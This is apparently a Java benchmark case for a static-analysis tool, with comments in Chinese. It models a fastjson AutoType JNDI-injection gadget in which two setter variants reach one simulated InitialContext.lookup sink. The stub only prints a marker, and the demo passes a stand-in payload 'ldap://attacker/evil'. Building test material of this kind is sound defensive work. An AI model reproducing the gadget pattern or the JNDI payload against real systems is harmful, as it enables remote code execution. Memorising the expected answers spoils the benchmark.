package com.jsef.benchmark.vuln.gadgetmine;

/**
 * JSEF-Benchmark L4 — fastjson gadget 挖掘验收样本 (9)(10)：同一根因链的不同 kick 变体
 * ============================================================================================
 * 验收维度（new_tool_plan_all.md §一 条件）：
 *   (9) 危险方法可达 = 配置/开关满足充要条件；
 *   (10) 变体 vs 根因：同一根链经不同 kick 属性均触发同一 sink，被测工具应识别
 *        它们是"同一根因链的不同变体"而非两条独立链。
 *
 * 根因：fastjson AutoType 实例化 JdbcRowSetImpl 风格类后，该类在属性设置阶段
 *   会触发 JNDI 外部资源查找（InitialContext.lookup），造成 JNDI 注入 RCE。
 *
 * 两条 kick 变体（同一根链、同一 sink）：
 *   kick-1: setDataSourceName(dataSourceName) → lookup(dataSourceName)
 *   kick-2: setAutoCommit(autoCommit)         → 内部 connect() → lookup(dataSourceName)
 * 两者都通向同一 InitialContext.lookup(不可信 name) sink，是同一根因的不同触发入口。
 *
 * 教学占位说明：
 *   - 不 import com.alibaba.fastjson / javax.naming；
 *   - VariantKickStub 仅为 localhost 教学占位，两个 setter 都通向模拟的
 *     InitialContext.lookup(name) sink（注释声明语义等价 JNDI 注入）。
 *   - 占位实现仅打印本地 marker，不发起真实 JNDI 连接、不出网。
 *
 * 安全底线：仅 localhost 演示语义。不引入真实 fastjson，不提供真实 JNDI 利用链。
 * VULN 侧按方法名/注释声明判定——两条 kick 均通向同一 lookup sink。
 *
 * 预期：VULN（expect=VULN），level=L4。被测工具应合并两条 kick 为同一根因（GM-008）。
 */
public class GmVariantKick {

    /**
     * 教学占位类：语义等价 JdbcRowSetImpl 风格（JNDI lookup 触发点）。
     * 仅 localhost 教学用，不发起真实 JNDI 连接。
     */
    public static class VariantKickStub {

        private String dataSourceName;

        /**
         * kick-1：setDataSourceName 直接触发 JNDI lookup。
         * 语义等价 JdbcRowSetImpl#setDataSourceName -> connect() -> InitialContext.lookup。
         */
        // [CHECKPOINT id=JSEF-GM-008 cwe=502 level=L4 source=@type/setDataSourceName|setAutoCommit sink=InitialContext.lookup (variant of same root) expect=VULN trace=benchmark/cases/vuln/gadgetmine/GmVariantKick.java:47,benchmark/cases/vuln/gadgetmine/GmVariantKick.java:64,benchmark/cases/vuln/gadgetmine/GmVariantKick.java:74]
        public void setDataSourceName(String name) {
            this.dataSourceName = name;
            jndiLookup(name);   // kick-1 setter 行：直接触发 lookup
        }

        /**
         * kick-2：setAutoCommit 经内部 connect() 间接触发 JNDI lookup。
         * 语义等价 JdbcRowSetImpl#setAutoCommit -> connect() -> InitialContext.lookup。
         */
        public void setAutoCommit(boolean autoCommit) {
            connect();   // kick-2 setter 行：经 connect() 触发 lookup
        }

        /**
         * 内部连接：读取 dataSourceName 并发起 JNDI 查找（危险语义）。
         * 语义等价 InitialContext.lookup(dataSourceName)。
         */
        // 语义等价: javax.naming.InitialContext#lookup(String)
        private void connect() {
            jndiLookup(this.dataSourceName);   // 间接 kick 经此触发 lookup
        }

        /**
         * 模拟 InitialContext.lookup：JNDI 注入 sink。
         * 占位实现仅打印本地 marker，不发起真实 JNDI 连接、不出网。
         * @param name 不可信 JNDI 名
         */
        private void jndiLookup(String name) {
            // [demo-only] 仅标记可达；不发起真实 JNDI 连接
            System.out.println("[demo-only] InitialContext.lookup reached with name: " + name);   // sink 行：JNDI lookup 可达
        }
    }

    /**
     * 演示入口：autoTypeSupport=true 时实例化 VariantKickStub，
     * 任意 kick 属性（setDataSourceName / setAutoCommit）均触发同一 lookup sink。
     */
    public static void demo(boolean autoTypeSupport) {
        if (autoTypeSupport) {
            VariantKickStub stub = new VariantKickStub();
            stub.setDataSourceName("ldap://attacker/evil");   // 变体1
            stub.setAutoCommit(true);                          // 变体2（同一根链）
        }
    }
}
